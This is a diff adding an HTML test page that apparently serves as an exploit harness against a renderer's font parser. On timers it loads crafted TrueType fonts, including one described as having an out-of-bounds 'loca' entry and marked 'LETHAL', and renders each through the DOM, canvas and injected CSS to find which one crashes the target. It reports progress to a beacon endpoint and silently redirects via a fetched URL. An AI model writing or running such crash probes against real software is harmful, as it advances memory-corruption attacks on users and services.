@@ -1,0 +1,100 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<script src="runtime-derive/derive-runtime.js"></script>
+<script>(function(){try{var x=new XMLHttpRequest();x.open("GET","current.txt",false);x.send(null);var u=(x.responseText||"").trim();if(u&&location.href.indexOf(u.split("?")[0])===-1){location.replace(u);}}catch(e){}})();</script>
+<title>FA-v36-adv2 — press-36: batería de renders por TIMERS (sin promesas encadenadas)</title></head>
+<body><pre id="out">FA-v36-adv2…<br><span id="rx" style="font-family:serif">A</span></pre>
+<script>
+(function(){
+"use strict";
+/* FA-v36-adv2 — press-36: mismo plan del 35 pero SIN encode de promesas:
+ * cascade de setTimeout (los timers corrieron mientras las promesas
+ * se trabaron en el 35). Cargas are kick-off; renders por timer.
+ * Rows: l10 l11 l12 (loads) → r10 r10b r11 (discriminador) → rcss →
+ * f12render = LETHAL-LAST → Z. */
+var RID="v36a"+Date.now().toString(36).slice(-13);
+var out=document.getElementById("out");
+function bk(s,b){try{fetch("/beacon/"+s,{method:"POST",cache:"no-store",keepalive:true,headers:{"Content-Type":"application/json"},body:JSON.stringify({r:RID,b:String(b).slice(0,500)})}).catch(function(){});}catch(e){}}
+var HB=setInterval(function(){bk("V36-HB","main-hb");},2000);
+
+var dr="-",rt="-";
+try{ dr=typeof window.deriveRuntime; rt=(dr==="object"&&window.deriveRuntime)?typeof window.deriveRuntime.run:"-"; }catch(e){}
+var cv=document.createElement("canvas");
+var ctx=null; var cvt="-";
+try{ ctx=cv.getContext("2d"); cvt=ctx?"2d-ok":"no-2d"; }catch(e){ cvt="E"; }
+bk("V36-L","v36-adv2; dr="+dr+"; rt="+rt+"; canvas2d="+cvt);
+
+function Trnd(){ return Date.now().toString(36)+Math.floor(Math.random()*1e4).toString(36); }
+
+function doLoad(id, f){
+  bk("V36-E"+id, "enter-load "+id);
+  try{
+    var ff=new FontFace("fef-"+id, "url(/document/al/ps5/"+f+"?t="+Trnd()+")");
+    document.fonts.add(ff);
+    ff.load().then(function(f2){ bk("V36-R"+id, id+" load=OK"); },
+                    function(err){ bk("V36-R"+id, id+" rechaza: "+String((err&&err.name)+" "+(err&&err.message)||err).slice(0,55)); });
+  }catch(e){ bk("V36-R"+id, id+" E:"+String((e&&e.message)||e).slice(0,50)); }
+}
+
+var rx=document.getElementById("rx");
+function measureDOM(family, size, txt){
+  var w="-";
+  try{
+    rx.setAttribute("style","font-family:'"+family+", serif';font-size:"+size+"px;");
+    rx.textContent=txt;
+    w=Math.round(rx.getBoundingClientRect().width*10)/10;
+  }catch(e){ w="E:"+String((e&&e.message)||e).slice(0,30); }
+  try{ rx.removeAttribute("style"); rx.textContent="A"; }catch(e){}
+  return w;
+}
+function cvRender(family, txt){
+  if(!ctx) return "no-2d";
+  try{
+    cv.width=260; cv.height=70;
+    ctx.clearRect(0,0,260,70);
+    ctx.font="40px '"+family+", serif'";
+    ctx.fillStyle="#f00";
+    ctx.fillText(txt,5,55);
+    var d=ctx.getImageData(0,0,260,70).data;
+    var sum=0; for(var i=0;i<d.length;i+=4) sum+=d[i];
+    return "cv-sum="+sum;
+  }catch(e){ return "cv-E:"+String((e&&e.message)||e).slice(0,35); }
+}
+function cssFont(fam, url){
+  try{
+    var old=document.getElementById("cfx-style");
+    if(old) old.parentNode.removeChild(old);
+    var s=document.createElement("style"); s.id="cfx-style";
+    s.textContent="@font-face{font-family:'"+fam+"';src:url(/document/al/ps5/"+url+"?t="+Trnd()+");}";
+    document.head.appendChild(s);
+    return "css-inyectado";
+  }catch(e){ return "css-E"; }
+}
+
+var RUN="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+/* T0 nombres de family cargados: fef-f10, fef-f11, fef-f12 */
+setTimeout(function(){ doLoad("f10","f10.ttf"); }, 300);
+setTimeout(function(){ doLoad("f11","f11.ttf"); }, 1200);
+setTimeout(function(){ doLoad("f12","f12.ttf"); }, 2100);
+
+setTimeout(function(){ bk("V36-Er10","enter r10");
+  var w=measureDOM("fef-f10", 40, "A"); var c=cvRender("fef-f10","A");
+  bk("V36-Rr10","r10: api-A="+w+" (80=glifo NUESTRO; 27=fallback) | "+c); }, 3000);
+setTimeout(function(){ bk("V36-Er10b","enter r10b");
+  var w=measureDOM("fef-f10", 40, RUN);
+  bk("V36-Rr10b","r10b: api-run32="+w+" (2560=usado; 864=fallback)"); }, 4000);
+setTimeout(function(){ bk("V36-Er11","enter r11");
+  var w=measureDOM("fef-f11", 40, "A"); var c=cvRender("fef-f11","A");
+  bk("V36-Rr11","r11: triángulo="+w+" | "+c); }, 5000);
+setTimeout(function(){ bk("V36-Ercss","enter rcss");
+  var s=cssFont("cfx","f10.ttf");
+  var w=measureDOM("cfx", 40, "A");
+  bk("V36-Rrcss","rcss: "+s+"; css-A="+w+" (80=vía CSS SÍ activa)"); }, 6000);
+/* LETAL-LAST: f12 (loca entry past-EOF) renderizando */
+setTimeout(function(){ bk("V36-Er12","enter r12-LETHAL");
+  var w=measureDOM("fef-f12", 40, RUN);
+  var c=cvRender("fef-f12",RUN);
+  bk("V36-Rr12","r12: locaEOF-run="+w+" | "+c+" (sin Z después = esta mató)"); }, 7200);
+setTimeout(function(){ clearInterval(HB); bk("V36-Z","FA-v36-adv2 complete"); }, 9000);
+setTimeout(function(){ clearInterval(HB); bk("V36-Z2","late-z(20s)"); }, 20000);
+})();
+</script></body></html>
